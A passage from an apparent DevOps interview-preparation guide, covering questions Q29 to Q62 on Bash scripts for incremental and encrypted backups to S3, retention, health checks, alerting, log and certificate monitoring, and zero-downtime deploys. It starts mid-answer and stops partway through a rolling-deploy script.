<summary><b>Answer</b></summary>

**Situation read →** Only changed data should travel, and each backup should still look like a full snapshot for easy restores.

**What I'd do →**
1. To another server: `rsync` with hard-link snapshots, so unchanged files cost no extra space:
   ```bash
   today=/backups/$(date +%F)
   rsync -aH --delete --numeric-ids --link-dest=/backups/latest /data/ "$today/"
   ln -sfn "$today" /backups/latest
   ```
2. To S3: `aws s3 sync /data "s3://$bucket/data/" --sse AES256` uploads only changed files; enable bucket versioning for point-in-time recovery, with lifecycle rules for old versions.
3. Or use a deduplicating tool (restic, borg) that does content-defined chunking, encryption and retention policies.
4. Limit bandwidth (`rsync --bwlimit=20M`) and use `nice`/`ionice`.

**Why →** Incremental transfer cuts nightly volume to the daily change rate, and snapshots keep restores simple.

**Interview tip →** Mention that `aws s3 sync` compares size and modification time, not content, which matters for files rewritten with the same size.

</details>

### Q30. Compliance requires backups to be encrypted before they leave the server. How do you change the script? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Server-side encryption protects data at rest in S3, but client-side encryption means the cloud provider never sees plaintext.

**What I'd do →**
1. Encrypt with a public key so the server cannot decrypt its own backups:
   ```bash
   tar -czf - -C / etc srv/app | age -r "$AGE_PUBKEY" > "$out.tar.gz.age"
   # or: gpg --batch --encrypt --recipient backup@example.com --output "$out.gpg" "$out"
   ```
2. Keep the private key offline or in a secrets manager with restricted access, and test decryption in restore drills.
3. Still use `--sse aws:kms` on upload as defence in depth, and an IAM policy that only allows `s3:PutObject` for the server.
4. Use `set -o pipefail` so a tar failure is not hidden behind a successful encryption step.

**Why →** Public-key encryption means a compromised server cannot read historical backups.

**Interview tip →** Mention that losing the key means losing every backup, so key management is part of the design.

</details>

### Q31. Fifty servers back up to one S3 bucket. How do you structure keys and permissions? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need clear ownership, isolation between servers, and protection against a compromised server deleting all backups.

**What I'd do →**
1. Key layout: `servers/<hostname>/<hostname>-<UTC timestamp>.tar.gz`, so listing and lifecycle rules work per host.
2. Instance role permissions: `s3:PutObject` (and `s3:GetObject` for verification if needed) on `arn:aws:s3:::bucket/servers/${aws:PrincipalTag/Name}/*` or a per-host prefix; no `s3:DeleteObject`.
3. Bucket: versioning, default encryption, Block Public Access, lifecycle expiration, and Object Lock in governance or compliance mode for ransomware resistance.
4. Monitoring: a scheduled check that every host has an object newer than 26 hours.

**Why →** Put-only permissions plus versioning means a compromised host can add objects but cannot destroy history.

**Interview tip →** Mention "freshness monitoring per host"; a host that silently stopped backing up is the common failure.

</details>

### Q32. Implement retention of 7 daily, 4 weekly and 12 monthly backups (GFS) in a script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Classify each backup by date, keep the newest in each bucket, delete the rest.

**What I'd do →**
```bash
declare -A keep=()
mapfile -t files < <(find "$dir" -maxdepth 1 -name "$host-*.tar.gz" -printf '%f\n' | sort -r)
daily=0; declare -A seen_w seen_m
for f in "${files[@]}"; do
  d=${f#"$host-"}; d=${d:0:8}                          # YYYYMMDD from the name
  if (( daily < 7 )); then keep[$f]=1; daily=$((daily + 1)); fi
  w=$(date -d "$d" +%G-W%V); m=${d:0:6}
  if [[ -z ${seen_w[$w]:-} ]] && (( ${#seen_w[@]} < 4 )); then seen_w[$w]=1; keep[$f]=1; fi
  if [[ -z ${seen_m[$m]:-} ]] && (( ${#seen_m[@]} < 12 )); then seen_m[$m]=1; keep[$f]=1; fi
done
for f in "${files[@]}"; do [[ -n ${keep[$f]:-} ]] || rm -f -- "$dir/$f" "$dir/$f.sha256"; done
```
1. Files are processed newest first, so the first file seen in each week or month is the newest one.
2. Run it with a `--dry-run` that prints decisions before enabling deletion.

**Why →** GFS gives fine recent granularity and long history with few files.

**Interview tip →** Mention that for S3, tools like restic (`forget --keep-daily 7 --keep-weekly 4 --keep-monthly 12`) or lifecycle tiers do this without custom code.

</details>

### Q33. Archive application logs older than 30 days to S3 Glacier and remove them locally. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Upload first, verify, then delete; never delete on a failed upload.

**What I'd do →**
```bash
find /var/log/app -type f -name '*.gz' -mtime +30 -print0 |
while IFS= read -r -d '' f; do
  key="logs/$(hostname -s)/${f#/var/log/app/}"
  if aws s3 cp --only-show-errors --storage-class GLACIER_IR -- "$f" "s3://$BUCKET/$key"; then
    rm -f -- "$f"
  else
    echo "upload failed, keeping $f" >&2
  fi
done
```
1. `GLACIER_IR` (Instant Retrieval) or `DEEP_ARCHIVE` depending on retrieval needs and cost.
2. Better: upload to `STANDARD` and let a lifecycle rule transition objects, which keeps the script simple.

**Why →** The `if upload; then delete` ordering makes data loss impossible on network errors.

**Interview tip →** Mention retrieval costs and delays for Glacier classes, because cheap storage is not cheap restores.

</details>

### Q34. The backup job slows down the production database server during business hours. How do you reduce its impact? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The job competes for CPU, disk I/O and network.

**What I'd do →**
1. Schedule it off-peak with a systemd timer: `OnCalendar=*-*-* 02:30:00 UTC`.
2. Lower priority: `nice -n 15 ionice -c3 tar ...`, or in the unit `Nice=15`, `IOSchedulingClass=idle`, `CPUQuota=30%`.
3. Limit bandwidth: `aws configure set default.s3.max_bandwidth 50MB/s`, `rsync --bwlimit`.
4. Back up from a replica instead of the primary when possible.
5. Use faster compression (`zstd -T2 -3`) to reduce CPU time.

**Why →** Priority and bandwidth limits let the job use spare capacity without starving production.

**Interview tip →** Mention that `ionice -c3` (idle) only helps with I/O schedulers that honour it (BFQ); with `none`/`mq-deadline` on NVMe, cgroup I/O limits are more reliable.

</details>

### Q35. How do you verify that a file uploaded to S3 is intact? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Network errors and partial uploads must be detected before you delete the local copy.

**What I'd do →**
1. Compare the size after upload:
   ```bash
   local_size=$(stat -c %s "$f")
   remote_size=$(aws s3api head-object --bucket "$B" --key "$K" --query ContentLength --output text)
   [[ $local_size == "$remote_size" ]] || die "size mismatch"
   ```
2. Upload a SHA-256 checksum alongside, or use S3's checksum support: `aws s3api put-object --checksum-algorithm SHA256 ...` and read it back with `head-object --checksum-mode ENABLED`.
3. During restore tests, download and run `sha256sum -c`.

**Why →** The CLI already retries and validates parts, but an explicit check gives evidence in logs and catches logic errors such as uploading the wrong file.

**Interview tip →** Mention that the ETag equals the MD5 only for single-part, non-KMS uploads, so do not rely on it as a checksum.

</details>

### Q36. An app writes `app-YYYY-MM-DD.log` files daily. There is no logrotate. Write the housekeeping. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compress yesterday's and older files, delete old compressed files, and never touch today's file.

**What I'd do →**
```bash
dir=/var/log/app
today="app-$(date +%F).log"
find "$dir" -maxdepth 1 -type f -name 'app-*.log' ! -name "$today" -mmin +60 -exec gzip -9 -- {} +
find "$dir" -maxdepth 1 -type f -name 'app-*.log.gz' -mtime +30 -delete
```
1. `! -name "$today"` and `-mmin +60` protect the active file.
2. Schedule daily at 00:15 via a timer.

**Why →** Date-named files need no rename or signal; compression and deletion by age are enough.

**Interview tip →** Mention that logrotate can still do this with `dateext` patterns, but a two-line `find` is often clearer.

</details>

### Q37. Back up every MySQL database separately, skipping system schemas. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate dumps allow restoring one database without the others.

**What I'd do →**
```bash
set -Eeuo pipefail
mapfile -t dbs < <(mysql --defaults-extra-file=/etc/mysql/backup.cnf -NBe 'SHOW DATABASES' |
  grep -Ev '^(information_schema|performance_schema|mysql|sys)$')
for db in "${dbs[@]}"; do
  mysqldump --defaults-extra-file=/etc/mysql/backup.cnf --single-transaction --routines --triggers -- "$db" |
    gzip > "/var/backups/mysql/${db}-$(date -u +%Y%m%dT%H%M%SZ).sql.gz"
done
```
1. Credentials in a `0600` option file, not on the command line.
2. `--single-transaction` gives a consistent snapshot for InnoDB without locking tables.
3. `-NB` gives raw output without headers or boxes.

**Why →** Per-database dumps make partial restores fast, and `pipefail` catches a failing `mysqldump`.

**Interview tip →** Mention that logical dumps are slow for very large databases; physical tools (Percona XtraBackup) or managed snapshots fit better there.

</details>

### Q38. A backup job sometimes runs twice at the same time and the archives are corrupted. How do you prevent it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A slow run overlaps with the next scheduled one, or someone ran it manually during the scheduled run.

**What I'd do →**
1. Take an exclusive lock at the top of the script:
   ```bash
   exec 9>/run/lock/backup.lock
   flock -n 9 || { echo "backup already running, skipping" >&2; exit 0; }
   ```
2. Write to unique temp names and `mv` into place, so even an unexpected overlap cannot interleave writes.
3. If migrating to systemd timers, systemd will not start a service that is already running.

**Why →** `flock` locks are released by the kernel when the process dies, so there are no stale lock files after a crash.

**Interview tip →** Explain why PID files are worse: they go stale after `kill -9`, and PIDs get reused.

</details>

### Q39. You need to tar a directory that the application writes to constantly. `tar` keeps exiting with 1. How do you handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GNU tar exits 1 when a file changed while it was being read; exit 2 is a fatal error. Under `set -e`, exit 1 aborts the backup.

**What I'd do →**
1. Treat 1 as a warning, above 1 as failure:
   ```bash
   rc=0
   tar --warning=no-file-changed -czf "$tmp" -C / srv/app/data || rc=$?
   (( rc <= 1 )) || die "tar failed with $rc"
   (( rc == 1 )) && log WARN "files changed during backup"
   ```
2. For consistency, snapshot first: LVM or ZFS snapshot, EBS snapshot, or the application's own backup command (databases must never be backed up by copying live files).
3. Or pause writes briefly (maintenance mode) for small datasets.

**Why →** A file that changes mid-read may be inconsistent; for logs that is fine, for database files it is corruption.

**Interview tip →** Mention snapshots as the real fix for consistency, not tar flags.

</details>

### Q40. Clean up files older than two days in `/tmp/app-cache`, owned by `app`, where filenames may contain spaces and newlines. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Let `find` select and delete; no parsing of names is needed.

**What I'd do →**
```bash
find /tmp/app-cache -xdev -type f -user app -mtime +2 -print -delete
find /tmp/app-cache -xdev -mindepth 1 -type d -empty -delete
```
1. `-xdev` stays on one filesystem; `-print` logs what was deleted.
2. `-delete` handles any filename because no shell or `xargs` splitting is involved.
3. Alternatively, declare it with systemd-tmpfiles: `d /tmp/app-cache 0750 app app 2d` in `/etc/tmpfiles.d/app.conf`.

**Why →** The safest way to handle weird filenames is to never turn them into text.

**Interview tip →** Mention systemd-tmpfiles; many teams forget it exists and write cron jobs instead.

</details>

---

## Scenarios: health checks, monitoring and alerts

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q41. You are asked for a host health-check script covering disk, memory, systemd services and an HTTP endpoint. How do you design it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** It must be fast, never hang, report every check (not stop at the first failure), and return a machine-readable result.

**What I'd do →**
1. One function per check, each calling `record STATUS CHECK TARGET DETAIL` that appends to an array and tracks the worst status.
2. Disk from `df -P -x tmpfs -x devtmpfs`, memory from `MemAvailable` in `/proc/meminfo`, services with `systemctl is-active`, HTTP with `curl -sS -o /dev/null --max-time 5 -w '%{http_code}'`.
3. Warning and critical thresholds from a config file, overridable by environment.
4. Exit with Nagios-style codes (0 OK, 1 WARNING, 2 CRITICAL, 3 UNKNOWN), so monitoring systems and systemd can consume it.
5. Do not use `set -e` to abort on the first failed check; capture each result instead.
6. Alert per failing check with a dedupe key, and send a "resolved" when it recovers.

**Why →** A health check that dies on the first problem hides the second one, and one that hangs is worse than none.

**Interview tip →** The [hands-on lab](./hands-on-lab.md) builds exactly this, with tests. Walk through its exit codes.

</details>

### Q42. Your disk alert fires and clears every few minutes around 80%, spamming Slack. How do you fix the alerting? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** The value oscillates around a single threshold and every check sends a message: no deduplication, no hysteresis.

**What I'd do →**
1. **Deduplicate:** store a state file per alert key (`alerts/disk-var`) with the time it fired; suppress repeats within a cooldown (for example, 1 hour).
2. **Hysteresis:** fire at 85%, clear only below 80%.
   ```bash
   firing=$([[ -e $state ]] && echo 1 || echo 0)
   if (( pct >= 85 )) || (( firing && pct >= 80 )); then alert; elif (( firing )); then resolve; fi
   ```
3. **Duration:** require N consecutive bad checks before alerting (keep a counter in the state file).
4. Send **resolved** messages so people know when to stop looking.
5. Separate warning (ticket or channel) from critical (page).

**Why →** Alert fatigue makes people mute channels, and then the real alert is missed.

**Interview tip →** Use the word "hysteresis". It is what Prometheus `for:` clauses and Alertmanager grouping solve in larger setups.

</details>

### Q43. A server reports `No space left on device` but `df -h` shows 40% free. What would you add to the health checks? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The filesystem has run out of inodes, usually from millions of tiny files (sessions, cache, mail queue).

**What I'd do →**
1. Confirm: `df -i`.
2. Find the directory: `find / -xdev -type d -size +1M 2>/dev/null` (huge directories) or count files per directory with `du --inodes -x -d 2 / | sort -n | tail`.
3. Add an inode check next to the disk check:
   ```bash
   df -Pi -x tmpfs -x devtmpfs | awk -v t=90 'NR > 1 && $5 != "-" {sub(/%/, "", $5); if ($5+0 >= t) print $6, $5"%"}'
   ```
4. Fix the source: session cleanup, cache TTLs, tmpfiles rules.

**Why →** Inode exhaustion fails writes exactly like a full disk but is invisible to `df -h`.

**Interview tip →** Mention XFS allocates inodes dynamically while ext4 fixes the count at mkfs time, which is why this hits ext4 more.

</details>

### Q44. Alert when any certificate under `/etc/letsencrypt/live` expires within 21 days. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `openssl x509 -checkend` does the date math and returns a clean exit code.

**What I'd do →**
```bash
rc=0
for cert in /etc/letsencrypt/live/*/fullchain.pem; do
  [[ -e $cert ]] || continue
  if ! openssl x509 -checkend $((21 * 86400)) -noout -in "$cert" >/dev/null; then
    end=$(openssl x509 -enddate -noout -in "$cert" | cut -d= -f2)
    echo "CRIT ${cert%/fullchain.pem}: expires $end"
    rc=2
  fi
done
exit "$rc"
```
1. `-checkend N` exits 1 if the cert expires within N seconds.
2. Also check what the server actually serves (`openssl s_client -connect host:443 -servername host`), since a renewed file is useless if nginx was never reloaded.

**Why →** Expired certificates cause total outages and are 100% predictable.

**Interview tip →** Mention checking the served certificate, not only the file; renewal without reload is a common miss.

</details>

### Q45. A developer wrote a Bash loop that restarts the app whenever its process disappears. What do you suggest instead? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A watchdog loop is a fragile supervisor: it can die itself, misses fast crash loops, and has no backoff or logging.

**What I'd do →**
1. Run the app as a systemd service with restart policy:
   ```ini
   [Service]
   ExecStart=/srv/app/current/bin/server
   Restart=on-failure
   RestartSec=5
   StartLimitIntervalSec=300
   StartLimitBurst=5
   ```
2. Add `WatchdogSec=` if the app can send `sd_notify` heartbeats, which catches hangs, not just exits.
3. Alert via `OnFailure=` when the start limit is hit.
4. In Kubernetes, the equivalent is liveness probes and the restart policy.

**Why →** The init system already supervises processes reliably, with logging and rate limiting.

**Interview tip →** Say "don't write a supervisor in Bash" and name the systemd directives.

</details>

### Q46. You suspect a memory leak in a service. How do you collect evidence with a script before involving developers? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need a time series of the process's memory to show a monotonic increase, plus restarts.

**What I'd do →**
1. Sample every minute from a timer, appending CSV:
   ```bash
   pid=$(systemctl show -p MainPID --value app)
   rss=$(awk '/^VmRSS:/ {print $2}' "/proc/$pid/status")
   cg=$(cat "/sys/fs/cgroup/system.slice/app.service/memory.current")
   printf '%s,%s,%s,%s\n' "$(date -u +%FT%TZ)" "$pid" "$rss" "$cg" >> /var/lib/memwatch/app.csv
   ```
2. Track the cgroup's `memory.current` too: it includes child processes and page cache charged to the service.
3. Summarize growth per hour with `awk`, and correlate with PID changes (restarts) and deploy times.
4. Alert if growth exceeds a slope (for example 50 MB per hour sustained for 6 hours).

**Why →** A graph of steady growth across restarts is the evidence developers need; a single `free -m` snapshot is not.

**Interview tip →** Mention that `MemoryMax=` in the unit turns a leak into a contained restart instead of a host OOM.

</details>

### Q47. How do you know a scheduled job actually ran, not just that it did not report failure? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Failure alerts do not fire if the job never starts (timer disabled, host down, cron syntax error).

**What I'd do →**
1. Add a dead man's switch: the job pings a heartbeat URL on success (Healthchecks.io, Cronitor, or an internal endpoint), and the monitor alerts when pings stop:
   ```bash
   trap 'curl -fsS -m 10 --retry 3 "$HEARTBEAT_URL/fail" >/dev/null || true' ERR
   ...
   curl -fsS -m 10 --retry 3 "$HEARTBEAT_URL" >/dev/null || true
   ```
2. Or check freshness of the job's output: newest backup in S3 younger than 26 hours.
3. Export a "last success" timestamp metric (node_exporter textfile collector) and alert on `time() - last_success > 90000`.

**Why →** Monitoring absence of success catches every failure mode, including ones you did not think of.

**Interview tip →** Say "alert on missing success, not only on reported failure".

</details>

### Q48. An endpoint returns HTTP 200 even when the app is degraded; the JSON body has `"status": "degraded"`. How do you check it in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The status code is not enough; parse the body.

**What I'd do →**
```bash
body=$(curl -fsS --max-time 5 http://127.0.0.1:8080/health) || { echo "CRIT unreachable"; exit 2; }
status=$(jq -r '.status // "unknown"' <<<"$body")
case $status in
  ok)       echo "OK";              exit 0 ;;
  degraded) echo "WARN degraded: $(jq -c '.checks' <<<"$body")"; exit 1 ;;
  *)        echo "CRIT status=$status"; exit 2 ;;
esac
```
1. `curl -f` turns HTTP 4xx and 5xx into a non-zero exit.
2. The `// "unknown"` default handles a missing field.

**Why →** Health semantics live in the body for many apps; ignoring it gives false greens.

**Interview tip →** Mention timeouts on every probe; a hanging health check blocks the next one.

</details>

### Q49. You need to alert if "Out of memory" appears more than 50 times in 5 minutes in an app log, without a logging stack. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Count matches in a time window. Using the journal or a byte offset avoids rescanning the whole file.

**What I'd do →**
1. If the app logs to journald:
   ```bash
   n=$(journalctl -u app --since '5 min ago' --no-pager -o cat | grep -c 'Out of memory' || true)
   (( n > 50 )) && opskit-alert -s critical -k app-oom -t "app OOM errors" "$n in 5 minutes"
   ```
2. For a file, remember the last byte offset in a state file and read only new data with `tail -c +$((offset + 1))`, resetting if the file shrank (rotation).
3. Run it every 5 minutes from a timer.

**Why →** Windowed counts give rate-based alerts without Loki or Elasticsearch.

**Interview tip →** Mention handling rotation (file shrank or inode changed), which is where homemade log watchers break.

</details>

### Q50. Security wants an alert if a server listens on any port not in an approved list. Write it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compare the current listening sockets against an allow-list.

**What I'd do →**
```bash
allowed=(22 80 443 9100)
mapfile -t listening < <(ss -Htlnu | awk '{print $5}' | sed -E 's/.*:([0-9]+)$/\1/' | sort -un)
unexpected=$(comm -13 <(printf '%s\n' "${allowed[@]}" | sort -u) <(printf '%s\n' "${listening[@]}"))
if [[ -n $unexpected ]]; then
  echo "CRIT unexpected listening ports: $(paste -sd, <<<"$unexpected")"
  ss -Htlnup | grep -E ":($(paste -sd'|' <<<"$unexpected"))\b"
  exit 2
fi
```
1. `ss -H` drops the header, `-p` (as root) shows the owning process for the report.
2. `comm -13` prints lines only in the second (current) list.

**Why →** An unexpected listener is either drift or compromise; both deserve attention.

**Interview tip →** Mention that `comm` needs both inputs sorted the same way.

</details>

### Q51. Alert when any systemd unit on a host is in a failed state. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** systemd already tracks failed units; just query it.

**What I'd do →**
```bash
mapfile -t failed < <(systemctl list-units --state=failed --no-legend --plain | awk '{print $1}')
if (( ${#failed[@]} )); then
  echo "CRIT failed units: ${failed[*]}"
  for u in "${failed[@]}"; do journalctl -u "$u" -n 5 --no-pager; done
  exit 2
fi
echo "OK no failed units"
```
1. `systemctl is-system-running` returns `degraded` when any unit failed, a quick one-word check.
2. After fixing, `systemctl reset-failed` clears the state.

**Why →** Failed oneshot units (backups, cert renewals) are easy to miss because nothing restarts them.

**Interview tip →** Mention `systemctl is-system-running` for a single status word.

</details>

### Q52. How do you check load average sensibly in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A load of 8 is idle on a 32-core box and overloaded on a 2-core box; compare to CPU count.

**What I'd do →**
```bash
read -r l1 l5 _ < /proc/loadavg
cores=$(nproc)
awk -v l="$l5" -v c="$cores" 'BEGIN {r = l / c; printf "load5 per core: %.2f\n", r; exit !(r > 1.5)}' &&
  echo "WARN sustained load above 1.5 per core"
```
1. Use the 5-minute average to ignore short spikes.
2. Remember Linux load includes processes in uninterruptible I/O wait (`D` state), so high load with idle CPU points to storage or NFS.

**Why →** Normalizing per core makes one threshold work across instance sizes.

**Interview tip →** Mention the `D`-state nuance; it shows you understand what load actually measures on Linux.

</details>

### Q53. The health-check script itself started hanging, and cron has 30 copies running. What happened and how do you harden it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A check blocked forever, most likely `df` or `stat` on a hung NFS mount, or a `curl` without a timeout, and cron kept starting new copies.

**What I'd do →**
1. Find what blocks: `ps -eo pid,stat,wchan:30,cmd | grep -E 'health|df'` (state `D` on `nfs` points at the mount).
2. Bound every external call: `timeout 10 df -P`, `curl --max-time 5`, `ssh -o ConnectTimeout=5`.
3. Skip network filesystems in disk checks (`df -l` or `-x nfs -x nfs4 -x cifs`) and check them separately with a timeout.
4. Add a single-instance lock (`flock -n`) and an overall `timeout` in the scheduler (`TimeoutStartSec=` in systemd).
5. Report a hung check as UNKNOWN or CRITICAL instead of hanging.

**Why →** A monitoring script that hangs both hides problems and adds load during an incident.

**Interview tip →** Say "every external call gets a timeout" as a rule you always follow.

</details>

### Q54. You want your script's results on Grafana dashboards without running a new service. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** If node_exporter runs on the host, its textfile collector exposes metrics from `.prom` files.

**What I'd do →**
```bash
dir=/var/lib/node_exporter/textfile_collector
tmp=$(mktemp "$dir/.backup.prom.XXXXXX")
cat > "$tmp" <<EOF
# HELP opskit_backup_last_success_timestamp_seconds Last successful backup.
# TYPE opskit_backup_last_success_timestamp_seconds gauge
opskit_backup_last_success_timestamp_seconds $(date +%s)
# HELP opskit_backup_size_bytes Size of the last backup.
# TYPE opskit_backup_size_bytes gauge
opskit_backup_size_bytes $size
EOF
chmod 0644 "$tmp"
mv -f -- "$tmp" "$dir/opskit_backup.prom"
```
1. Start node_exporter with `--collector.textfile.directory=/var/lib/node_exporter/textfile_collector`.
2. Write atomically (temp file + `mv`) so the exporter never reads half a file.
3. Alert in Prometheus: `time() - opskit_backup_last_success_timestamp_seconds > 93600`.

**Why →** You reuse existing scraping, dashboards and alerting with a few lines of shell.

**Interview tip →** Mention the atomic write; partially written `.prom` files cause scrape errors.

</details>

### Q55. Alerts must go to Slack for warnings, and to PagerDuty plus Slack for critical. How do you structure that in shell? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Keep routing in one alert script; checks only state severity.

**What I'd do →**
1. A single `alert` command taking `-s severity -t title -k key message`.
2. Route by severity:
   ```bash
   case $severity in
     critical) send_slack; send_pagerduty ;;
     warning)  send_slack ;;
     info)     log only ;;
   esac
   ```
3. PagerDuty Events API v2 with a `dedup_key` equal to the alert key, so repeats update one incident and `"event_action": "resolve"` closes it.
4. Build every payload with `jq -n --arg`, use `curl --max-time 10 --retry 3`, and log delivery failures without failing the check.

**Why →** Central routing means changing escalation policy is one edit, not fifty.

**Interview tip →** Mention using the same key for dedupe in your state file and in PagerDuty's `dedup_key`.

</details>

### Q56. Write a check for Postgres replication lag on a replica. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** On a replica, compare now with the last replayed transaction timestamp.

**What I'd do →**
```bash
lag=$(psql -XtAc "select coalesce(extract(epoch from now() - pg_last_xact_replay_timestamp()), 0)::int" 2>/dev/null) ||
  { echo "CRIT cannot query replica"; exit 2; }
if   (( lag > 300 )); then echo "CRIT replication lag ${lag}s"; exit 2
elif (( lag > 60 ));  then echo "WARN replication lag ${lag}s"; exit 1
else echo "OK lag ${lag}s"; fi
```
1. `-X` ignores `~/.psqlrc`, `-tA` gives a bare value.
2. On a quiet primary, replay timestamps stop advancing even with zero lag; compare `pg_last_wal_receive_lsn()` and `pg_last_wal_replay_lsn()` too, or write a heartbeat row on the primary every minute.

**Why →** Reads from a lagging replica return stale data, which breaks business logic silently.

**Interview tip →** Mention the idle-primary false positive; it shows you have run this in production.

</details>

### Q57. Monitoring shows hundreds of zombie processes on a host. How do you detect and report them in a script? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Zombies (`Z` state) are finished children whose parent has not called `wait()`. They use no CPU or memory, only PID slots, but they point to a buggy parent.

**What I'd do →**
```bash
ps -eo stat=,ppid= | awk '$1 ~ /^Z/ {z[$2]++} END {for (p in z) print p, z[p]}' |
while read -r ppid count; do
  echo "WARN $count zombies under ppid $ppid ($(ps -o comm= -p "$ppid"))"
done
```
1. You cannot kill a zombie; fix or restart the **parent**, after which init reaps them.
2. In containers, add an init (`docker run --init`, `tini`) when the main process does not reap children.

**Why →** Reporting the parent tells you what to fix; counting zombies alone does not.

**Interview tip →** Say "kill the parent, not the zombie".

</details>

### Q58. Write a quick check that a host's clock is synchronized. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Clock skew breaks TLS, Kerberos, distributed locks, log correlation and AWS request signing (`RequestTimeTooSkewed`).

**What I'd do →**
```bash
synced=$(timedatectl show -p NTPSynchronized --value)
[[ $synced == yes ]] || { echo "CRIT clock not NTP-synchronized"; exit 2; }
if command -v chronyc >/dev/null; then
  offset=$(chronyc tracking | awk '/^System time/ {print $4}')
  awk -v o="$offset" 'BEGIN {exit !(o > 0.5)}' && { echo "WARN offset ${offset}s"; exit 1; }
fi
echo "OK clock synchronized"
```

**Why →** Time problems produce confusing errors far from the root cause.

**Interview tip →** Mention AWS's `RequestTimeTooSkewed` error as a real-world symptom.

</details>

### Q59. Instead of alerting at 90% disk, management wants a warning when `/var` will fill within 24 hours. How do you do it in shell? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need samples over time and a growth rate; a single reading cannot predict anything.

**What I'd do →**
1. Every 10 minutes, append `epoch,used_bytes,size_bytes` for `/var` to a state file, keeping the last 12 hours.
2. Compute a linear trend with `awk` (least squares over the window) and the time to full:
   ```bash
   awk -F, '{n++; sx+=$1; sy+=$2; sxy+=$1*$2; sxx+=$1*$1; size=$3; last=$2}
     END {d = n*sxx - sx*sx; if (n < 6 || d == 0) exit 3
          slope = (n*sxy - sx*sy) / d
          if (slope <= 0) {print "OK not growing"; exit 0}
          hours = (size - last) / slope / 3600
          printf "%s full in %.1f hours\n", (hours < 24 ? "CRIT" : "OK"), hours
          exit (hours < 24 ? 2 : 0)}' /var/lib/diskwatch/var.csv
   ```
3. Require enough samples and ignore negative slopes (cleanups).

**Why →** Predictive alerts give hours of warning, while a static threshold may fire at 3 AM with minutes left.

**Interview tip →** Mention that Prometheus does this natively with `predict_linear(node_filesystem_avail_bytes[6h], 24*3600) < 0`.

</details>

### Q60. A dashboard reads a JSON status file that your script writes every minute. Sometimes the dashboard shows parse errors. Fix it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The dashboard reads the file while the script is in the middle of writing it.

**What I'd do →**
```bash
out=/var/lib/opskit/status.json
tmp=$(mktemp "${out}.XXXXXX")
jq -n --arg host "$(hostname -s)" --argjson disk "$disk_pct" --arg ts "$(date -u +%FT%TZ)" \
  '{host: $host, disk_pct: $disk, updated: $ts}' > "$tmp"
chmod 0644 "$tmp"
mv -f -- "$tmp" "$out"
```
1. Write to a temp file in the same directory, then rename.
2. Build JSON with `jq` so it is always valid.

**Why →** Rename is atomic on the same filesystem; readers see the old or new file, never a partial one.

**Interview tip →** Explain that `mktemp` creates files with mode 0600, so set permissions before the `mv` if others must read it.

</details>

---

## Scenarios: deployments, user management and fleet operations

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q61. Write the core of a deploy script with release directories, an atomic symlink switch and rollback. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The "Capistrano layout" gives zero-downtime switching and instant rollback.

**What I'd do →**
```bash
base=/srv/app; release=$(date -u +%Y%m%dT%H%M%SZ); dir="$base/releases/$release"
mkdir -p "$dir"
tar -xzf "/tmp/app-$version.tgz" -C "$dir"
ln -sfn "$base/shared/.env" "$dir/.env"
previous=$(readlink -f "$base/current" || true)

ln -sfn "$dir" "$base/current.tmp" && mv -T "$base/current.tmp" "$base/current"   # atomic switch
sudo systemctl reload app

if ! wait_for_http http://127.0.0.1:8080/readyz 60; then
  echo "health check failed, rolling back to $previous" >&2
  ln -sfn "$previous" "$base/current.tmp" && mv -T "$base/current.tmp" "$base/current"
  sudo systemctl reload app
  exit 1
fi
```
1. `ln -sfn` alone unlinks then creates; `mv -T` of a temp link is a true atomic `rename()`.
2. Keep the last N releases for rollback (see the cleanup in Q26).

**Why →** All preparation happens off to the side; the only live change is one rename.

**Interview tip →** Explain why `mv -T` matters: without it, `mv` would move the link **into** the existing `current` directory.

</details>

### Q62. Deploy to 10 servers behind an AWS ALB one at a time, removing each from the target group during its deploy. Outline the script. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rolling deploy with traffic draining: deregister, wait for draining, deploy, health check, register, wait until healthy, next.

**What I'd do →**
```bash
for id in "${instance_ids[@]}"; do
  aws elbv2 deregister-targets --target-group-arn "$TG" --targets "Id=$id"
